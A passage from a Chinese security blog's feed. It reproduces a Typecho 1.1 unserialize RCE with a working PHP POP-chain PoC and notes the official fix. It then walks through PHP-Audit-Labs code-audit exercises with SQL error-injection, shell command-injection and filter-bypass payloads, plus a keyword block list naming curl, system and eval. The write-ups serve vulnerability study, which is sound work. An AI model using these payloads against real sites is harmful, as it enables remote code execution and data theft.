&#x3D; new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</span><br><span class="line">    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">    Typecho_Db::set($db);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里把从get中数据然后base64解码然后再反序列化，看一下get方法的实现：</p><p><img src="/images/typecho1.1/20200903191942.png" alt=""></p><p>这里用了一个三目运算符，如果cookie存在就从cookie中获取值，否则就从POST参数获取值。这里我们只要直接通过cookie或者post传入我们的payload就可以利用此次漏洞。</p><h2 id="反序列化利用链构造"><a href="#反序列化利用链构造" class="headerlink" title="反序列化利用链构造"></a>反序列化利用链构造</h2><p>因为这里是 <strong>unserialize</strong> 函数，首先我们肯定要找 <strong>__destruct()</strong> 魔术方法来利用反序列化，结果看了一圈也没有一个能用的，然后又全局搜索了 <strong>__wakeup()</strong> 方法，也是没有可以利用的。<br>然后往下看，new了一个 <strong>Typecho_Db</strong> 类，看看这个类的 <strong>__construct</strong> 。</p><p>db.php 114-120行：</p><p><img src="/images/typecho1.1/20200903192930.png" alt=""></p><p>可以看到这里用了字符串拼接操作，在这里可以触发 <strong>__toString()</strong> 方法，然后全局搜索__toString，在feed.php中发现可利用点。</p><p>feed.php 258-259行：</p><p><img src="/images/typecho1.1/20200903193610.png" alt=""></p><p>这里的 <strong>item[&#39;author&#39;]-&gt;screenName</strong> 可以触发 <strong>__get()</strong> 方法，然后全局搜索<strong>get方法，然后会在request.php中发现可以rce的</strong>get()方法。<br>首先是 </p><p>request.php 269-272行：</p><p><img src="/images/typecho1.1/20200903194148.png" alt=""></p><p>这里调用get函数，跟进</p><p>request.php 295-311行：</p><p><img src="/images/typecho1.1/20200903194308.png" alt=""></p><p>这里在最后会调用<code>_applyFilter</code>方法，看看这个方法</p><p>request.php 159-171行：</p><p><img src="/images/typecho1.1/20200903194421.png" alt=""></p><p>就会调用这里的call_user_func()执行函数。还要说的一个地方就是，当按照上面的所有流程构造poc之后，发请求到服务器，却会返回500。<br>原因是在install.php的开始，调用了 <strong>ob_start()</strong> ，当我们在执行的时候会触发原本的exception，导致ob_end_clean()执行，原本的缓冲区被清理。必须像一个办法下强制退出，使得代码不会执行到exception，这样原本的缓冲区数据就会被输出出来。</p><p>这里有两个办法。 1、因为call_user_func函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。 2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。</p><p>解决了这个问题，整个利用POP链就成立了<br>poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Typecho_Feed&#123;</span><br><span class="line">    private $_type &#x3D; &#39;RSS 2.0&#39;;</span><br><span class="line">    private $_charset &#x3D; &#39;UTF-8&#39;;</span><br><span class="line">    private $_lang &#x3D; &#39;zh&#39;;</span><br><span class="line">    private $_items &#x3D; array();</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;_items[] &#x3D; [&quot;author&quot;&#x3D;&gt;new Typecho_Request(),&#39;category&#39;&#x3D;&gt;array(new Typecho_Request())];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Request&#123;</span><br><span class="line">    private $_params &#x3D; array();</span><br><span class="line">    private $_filter &#x3D; array();</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;_filter &#x3D; array(&quot;assert&quot;);</span><br><span class="line">        $this-&gt;_params &#x3D; [&#39;screenName&#39;&#x3D;&gt;&#39;phpinfo()&#39;];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$config &#x3D; array(&#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,&quot;adapter&quot;&#x3D;&gt;new Typecho_Feed(),&quot;prefix&quot;&#x3D;&gt;&#39;123&#39;,&quot;pop&quot;&#x3D;&gt;&#39;123&#39;);</span><br><span class="line"></span><br><span class="line">echo serialize($config);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo base64_encode(serialize($config));</span><br></pre></td></tr></table></figure><p>成功执行：</p><p><img src="/images/typecho1.1/20200903194950.png" alt=""></p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>若是之前的版本只要删掉install.php就好了，看看官方的修复方法：</p><p><img src="/images/typecho1.1/20200903195426.png" alt=""></p><p>增加了对数据库的判断，原来finish被删掉了，这样就安全多了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;br&gt;上次国赛有一道这个题，&lt;strong&gt;baby_serialize&lt;/strong&gt;，看了好久也没做出来，感觉自己代码审计能力太差了，于是乎想找几个cms审审反序列化的链子，于是就有了这篇。
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>一篇writeup</title>
    <link href="http://yoursite.com/2020/08/27/Writeup/"/>
    <id>http://yoursite.com/2020/08/27/Writeup/</id>
    <published>2020-08-27T09:56:29.900Z</published>
    <updated>2020-08-27T10:27:10.552Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="不好意思，密码没对哦，在检查检查呢！" data-whm="不好意思，信息无法验证！">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">嗨，请准确无误地输入密码查看哟！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="1c0d2dc4ddff4152de1322bd17c9148f755fcabefa5fa4e882563634bcd5892c"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      咦，这是一篇加密文章，好像需要输入密码才能查看呢！
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>代码审计之——PHP-Audit-Labs</title>
    <link href="http://yoursite.com/2020/08/18/PHP-Audit-Labs/"/>
    <id>http://yoursite.com/2020/08/18/PHP-Audit-Labs/</id>
    <published>2020-08-18T10:13:47.000Z</published>
    <updated>2020-09-16T05:11:23.973Z</updated>
    
    <content type="html"><![CDATA[<p>在github上面找的一个代码审计的项目，地址是：</p><blockquote><p><a href="https://github.com/hongriSec/PHP-Audit-Labs/">https://github.com/hongriSec/PHP-Audit-Labs/</a><br>正好通过这个项目练习一下代码审计，每个都包含了不同的知识点，学习学习。</p></blockquote><a id="more"></a><h2 id="Day1-in-array函数缺陷"><a href="#Day1-in-array函数缺陷" class="headerlink" title="Day1 - in_array函数缺陷"></a>Day1 - in_array函数缺陷</h2><p>题目如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;index.php</span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;;</span><br><span class="line">$conn &#x3D; new mysqli($servername, $username, $password, $dbname);</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">    die(&quot;连接失败: &quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql &#x3D; &quot;SELECT COUNT(*) FROM users&quot;;</span><br><span class="line">$whitelist &#x3D; array();</span><br><span class="line">$result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">if($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">    $row &#x3D; $result-&gt;fetch_assoc();</span><br><span class="line">    $whitelist &#x3D; range(1, $row[&#39;COUNT(*)&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id &#x3D; stop_hack($_GET[&#39;id&#39;]);</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM users WHERE id&#x3D;$id&quot;;</span><br><span class="line"></span><br><span class="line">if (!in_array($id, $whitelist)) &#123;</span><br><span class="line">    die(&quot;id $id is not in whitelist.&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">if($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">    $row &#x3D; $result-&gt;fetch_assoc();</span><br><span class="line">    echo &quot;&lt;center&gt;&lt;table border&#x3D;&#39;1&#39;&gt;&quot;;</span><br><span class="line">    foreach ($row as $key &#x3D;&gt; $value) &#123;</span><br><span class="line">        echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;&#x2F;center&gt;&lt;&#x2F;td&gt;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;&#x2F;center&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;&#x2F;table&gt;&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;config.php</span><br><span class="line">&lt;?php  </span><br><span class="line">$servername &#x3D; &quot;localhost&quot;;</span><br><span class="line">$username &#x3D; &quot;root&quot;;</span><br><span class="line">$password &#x3D; &quot;root&quot;;</span><br><span class="line">$dbname &#x3D; &quot;day1&quot;;</span><br><span class="line"></span><br><span class="line">function stop_hack($value)&#123;</span><br><span class="line">    $pattern &#x3D; &quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\&#x2F;\*|\*|\.\.\&#x2F;|\.\&#x2F;|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;;</span><br><span class="line">    $back_list &#x3D; explode(&quot;|&quot;,$pattern);</span><br><span class="line">    foreach($back_list as $hack)&#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;$hack&#x2F;i&quot;, $value))</span><br><span class="line">            die(&quot;$hack detected!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return $value;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题考察的是<code>in_array()</code>绕过和不能使用拼接函数的<code>updatexml</code>报错注入。<br><strong>in_array()</strong>：<br>在index.php中把id值传入whitelist数组中，然后用户传入的id先经过过滤函数过滤，然后再用in_array判断用户传入的id是否在whitelist中。这里<code>in_array()</code>是没有使用强匹配，所以可以绕过，当传入的id值为<strong>1’</strong>便可绕过in_array函数。<br><strong>updatexml</strong>：<br>这个stop_hack函数把该过滤的都过滤了，其中过滤了concat连接函数，而我们如果使用updatexml报错注入前面都要拼接<code>0x7e</code>这样的特殊字符，否则查询的数据会丢失一部分，而concat被过滤了。我们还可以使用 <code>make_set</code> 或者 <code>export_set()</code> 函数来拼接字符，可以参考<a href="https://blog.csdn.net/fangzy0112/article/details/27323603">mysql make_set()的用法</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,export_set(1|1,&#39;~&#39;,(select user())),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~,root@localhost,root@localhost,&#39;</span><br><span class="line">mysql&gt; select updatexml(1,make_set(3,&#39;~&#39;,(select user())),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~,root@localhost&#39;</span><br></pre></td></tr></table></figure><p>然后看一下本题payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;4 and (select updatexml(1,make_set(3,&#39;~&#39;,(select flag from flag)),1))</span><br></pre></td></tr></table></figure><h2 id="Day2-filter-var函数缺陷"><a href="#Day2-filter-var函数缺陷" class="headerlink" title="Day2 - filter_var函数缺陷"></a>Day2 - filter_var函数缺陷</h2><p>题目如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info &#x3D; parse_url($url);</span><br><span class="line">    if(preg_match(&#39;&#x2F;sec-redclub.com$&#x2F;&#39;,$site_info[&#39;host&#39;]))&#123;</span><br><span class="line">        exec(&#39;curl &quot;&#39;.$site_info[&#39;host&#39;].&#39;&quot;&#39;, $result);</span><br><span class="line">        echo &quot;&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info[&#39;host&#39;]&#125; successfully!&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">              &lt;center&gt;&lt;textarea rows&#x3D;&#39;20&#39; cols&#x3D;&#39;90&#39;&gt;&quot;;</span><br><span class="line">        echo implode(&#39; &#39;, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;br&gt;</span><br><span class="line">          &lt;center&gt;&lt;h3&gt;For example:?url&#x3D;http:&#x2F;&#x2F;sec-redclub.com&lt;&#x2F;h3&gt;&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个考察的时filter_var函数的绕过与远程命令执行，中间exec函数拼接了<code>$site_info[&#39;host&#39;]</code>，而<code>$site_info[&#39;host&#39;]</code>是parse_url($url)得来的，url是我们传入可控的，问题就是药绕过filter_var的FILTER_VALIDATE_URL过滤器，这里提供了几个绕过方法，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com@sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&amp;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com?sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&#x2F;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com,sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com:80;sec-redclub.com:80&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com#sec-redclub.com</span><br><span class="line">PS:最后一个payload的#符号，请换成对应的url编码 %23</span><br></pre></td></tr></table></figure><p>接着要绕过 parse_url 函数，并且满足 $site_info[‘host’] 的值以 sec-redclub.com 结尾，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;demo:&#x2F;&#x2F;%22;ls;%23;sec-redclub.com:80&#x2F;</span><br></pre></td></tr></table></figure><p>不知道为什么在windows下加上#就绕过不了了，在linux下可以，然后<code>cat flag</code>的时候，因为filter_var函数不可以使用空格，换成<code>cat&lt;flag</code>就好了。</p><h2 id="Day3-实例化任意对象漏洞"><a href="#Day3-实例化任意对象漏洞" class="headerlink" title="Day3 - 实例化任意对象漏洞"></a>Day3 - 实例化任意对象漏洞</h2><p>先看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NotFound&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#39;404&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    function ($class)&#123;</span><br><span class="line">        new NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$classname &#x3D; isset($_GET[&#39;name&#39;]) ? $_GET[&#39;name&#39;] : null;</span><br><span class="line">$param &#x3D; isset($_GET[&#39;param&#39;]) ? $_GET[&#39;param&#39;] : null;</span><br><span class="line">$param2 &#x3D; isset($_GET[&#39;param2&#39;]) ? $_GET[&#39;param2&#39;] : null;</span><br><span class="line">if(class_exists($classname))&#123;</span><br><span class="line">    $newclass &#x3D; new $classname($param,$param2);</span><br><span class="line">    var_dump($newclass);</span><br><span class="line">    foreach ($newclass as $key&#x3D;&gt;$value)</span><br><span class="line">        echo $key.&#39;&#x3D;&gt;&#39;.$value.&#39;&lt;br&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例化漏洞结合XXE，不会，先跳过了。</p><h2 id="Day5-全局变量覆盖"><a href="#Day5-全局变量覆盖" class="headerlink" title="Day5 - 全局变量覆盖"></a>Day5 - 全局变量覆盖</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;index.php&#39;);</span><br><span class="line">function waf($a)&#123;</span><br><span class="line">    foreach($a as $key &#x3D;&gt; $value)&#123;</span><br><span class="line">        if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;</span><br><span class="line">            exit(&#39;are you a hacker&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;</span><br><span class="line">    if($$__R) &#123; </span><br><span class="line">        foreach($$__R as $__k &#x3D;&gt; $__v) &#123; </span><br><span class="line">            if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">if($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">if($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">if($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"></span><br><span class="line">if($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">if(isset($_GET[&#39;flag&#39;]))&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hongri&#39;])&#123;</span><br><span class="line">        exit(&#39;error&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(md5($_GET[&#39;flag&#39;] ) &#x3D;&#x3D; md5($_GET[&#39;hongri&#39;]))&#123;</span><br><span class="line">        $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">        $urlInfo &#x3D; parse_url($url);</span><br><span class="line">        if(!(&quot;http&quot; &#x3D;&#x3D;&#x3D; strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;&#x3D;&#x3D;&#x3D;strtolower($urlInfo[&quot;scheme&quot;])))&#123;</span><br><span class="line">            die( &quot;scheme error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $url &#x3D; escapeshellarg($url);</span><br><span class="line">        $url &#x3D; escapeshellcmd($url);</span><br><span class="line">        system(&quot;curl &quot;.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>循环获取字符串 <strong>GET、POST、COOKIE</strong> ，并依次赋值给变量 <strong>$__R</strong> 。然后判断 <strong>$$__R</strong> 变量是否存在数据，如果存在，则继续判断超全局数组 <strong>GET、POST、COOKIE</strong> 中是否存在键值相等的，如果存在，则删除该变量。这里有个 <strong>可变变量</strong> 的概念需要先理解一下。</p><blockquote><p>可变变量指的是：一个变量的变量名可以动态的设置和使用。一个可变变量获取了一个普通变量的值作为其变量名。</p></blockquote><p>我通过 <strong>GET</strong> 请求向 <strong>index.php</strong> 提交 <strong>flag=test</strong> ，接着通过 <strong>POST</strong> 请求提交 <strong>_GET[flag]=test</strong> 。当开始遍历 <strong>$_POST</strong> 超全局数组的时候， <strong>$__k</strong> 代表 <strong>_GET[flag]</strong> ，所以 <strong>$$__k</strong> 就是 <strong>$_GET[flag]</strong> ，即 <strong>test</strong> 值，此时 <strong>$$__k</strong> == <strong>$__v</strong> 成立，变量 <strong>$_GET[flag]</strong> 就被 <strong>unset</strong> 了。但是在 <strong>第21行</strong> 和 <strong>22行</strong> 有这样一串代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure><p><strong>extract</strong> 函数的作用是将对象内的键名变成一个变量名，而这个变量对应的值就是这个键名的值， <strong>EXTR_SKIP</strong> 参数表示如果前面存在此变量，不对前面的变量进行覆盖处理。由于我们前面通过 <strong>POST</strong> 请求提交 <strong>_GET[flag] = test</strong> ，所以这里会变成 <strong>$_GET[flag]=test</strong> ，这里的 <strong>$_GET</strong> 变量就不需要再经过 <strong>waf</strong> 函数检测了，也就绕过了 <strong>preg_match(‘/flag/i’,$key)</strong> 的限制。</p><p> 再往下就是提交两个md5值都是0e开头的值就好了</p><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>主要考察 <strong>curl</strong> 读取文件。这里主要加了两个坑， <strong>escapeshellarg()</strong> 和 <strong>escapeshellcmd()</strong> 一起使用的时候会造成的问题，主要看看这部分代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url &#x3D; escapeshellarg($url);</span><br><span class="line">$url &#x3D; escapeshellcmd($url);</span><br></pre></td></tr></table></figure><ul><li><strong>escapeshellarg</strong> ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</li><li><strong>escapeshellcmd</strong> ，会对以下的字符进行转义&amp;#;<code>|*?~&lt;&gt;^()[]{}$</code>, <code>x0A</code> 和 <code>xFF</code>, <code>&#39;</code> 和 <code>&quot;</code>仅在不配对儿的时候被转义。</li></ul><p>两个函数配合使用就会导致多个参数的注入，我们详细分析一下：</p><ol><li>传入的参数是：172.17.0.2’ -v -d a=1</li><li>经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li><li>经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a=1&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义.</li><li>最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1&#39;，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</li></ol><p>其实这里直接读取<code>127.0.0.1/flag.php</code>就好了。</p><h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if  (&quot;POST&quot; &#x3D;&#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;])</span><br><span class="line">&#123;</span><br><span class="line">    $password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">    if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#39;Wrong Format&#39;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    while (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;;</span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">            break;</span><br><span class="line">        $c &#x3D; 0;</span><br><span class="line">        $ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;);</span><br><span class="line">        foreach ($ps as $pt)</span><br><span class="line">        &#123;</span><br><span 